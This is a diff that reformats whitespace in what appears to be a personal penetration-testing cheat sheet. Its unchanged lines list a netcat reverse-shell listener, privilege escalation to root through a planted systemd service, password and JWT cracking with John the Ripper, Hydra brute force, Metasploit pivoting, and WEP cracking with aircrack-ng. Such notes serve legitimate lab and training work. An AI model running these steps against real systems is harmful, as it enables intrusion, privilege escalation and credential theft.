@@ -4,9 +4,9 @@
 
 ### Netcat
 
-Install ```sudo apt install ncat```
+Install```sudo apt install ncat```
 
-Start netcat listening on e.g. port 1234: ```nc -lvnp 1234```
+Start netcat listening on e.g. port 1234:```nc -lvnp 1234```
 
 Once payload is triggered netcat will open a reverse shell:
 
@@ -30,9 +30,9 @@ WantedBy=multi-user.target
 ```
 
 - move file to /temp/ of www-data from attacker box:
- -on victim: ```nc -vl 44444 > fab.service```
-- on attacker:  ```nc -n TargetIP 44444 < fab.service```
-- on attacker now start a new netcat session on 9999: ```nc -lvnp 9999```
+ -on victim:```nc -vl 44444 > fab.service```
+- on attacker: ```nc -n TargetIP 44444 < fab.service```
+- on attacker now start a new netcat session on 9999:```nc -lvnp 9999```
 
 Now use systemctl on victim machine and we should be root from the attacker box:
 
@@ -59,7 +59,7 @@ john forjohn.txt --wordlist /usr/share/wordlists/rockyou.txt
 
 Convert a JWT to a format John the Ripper can understand with [jwt2john](https://github.com/Sjord/jwtcrack):
 
- ``` sh
+``` sh
 wget --quiet -O /usr/local/bin/jwt2john.py "https://raw.githubusercontent.com/Sjord/jwtcrack/master/jwt2john.py"
 sed -i '1s;^;#!/usr/bin/env python\n;' /usr/local/bin/jwt2john.py
 chmod +x /usr/local/bin/jwt2john.py
@@ -85,14 +85,14 @@ hydra -l user -P /usr/share/wordlists/rockyou.txt 10.10.233.243 http-post-form "
 
 Start PostgreSQL und Metasploit on boot
 
- ``` sh
+``` sh
 update-rc.d postgresql enable
 update-rc.d metasploit enable
 ```
 
 Manuall start
 
- ``` sh
+``` sh
 service postgresql start
 service metasploit start
 ```
@@ -170,13 +170,13 @@ run autoroute -s 10.10.201.217 -n 255.255.255.0
 
 Send Kismet dump
 
- ``` sh
+``` sh
 aircrack-ng -b 00:1E:58:B4:24:F4 /root/Kismet.dump
 ```
 
 Preparing The WIFI Card for Airodump
 
- ``` sh
+``` sh
 modprobe -r iwl3945
 modprobe ipwraw
 airmon-ng start [device]
@@ -192,8 +192,8 @@ aircrack-ng -n 128 -b [bssid] [filename]-01.cap
 
 Config [Kismet](https://www.kismetwireless.net)
 
-- Config this file ```/usr/local/etc/kismet.conf```
-- And add a sourece e.g. ```source=ipw2200,eth1,Intel```
+- Config this file```/usr/local/etc/kismet.conf```
+- And add a sourece e.g.```source=ipw2200,eth1,Intel```
 
 Commands
 
